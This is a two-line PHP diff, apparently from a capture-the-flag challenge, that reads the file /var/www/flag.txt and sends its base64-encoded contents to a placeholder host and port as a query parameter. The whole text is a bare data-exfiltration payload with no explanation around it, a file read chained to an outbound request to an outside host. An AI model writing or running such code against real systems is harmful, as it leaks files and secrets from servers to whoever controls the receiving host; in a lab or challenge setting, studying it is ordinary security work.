@@ -1,0 +1,2 @@
+$flag = file_get_contents('/var/www/flag.txt');
+$content = file_get_contents('http://[HOST]:[PORT]/index.php?guess='.base64_encode($flag));
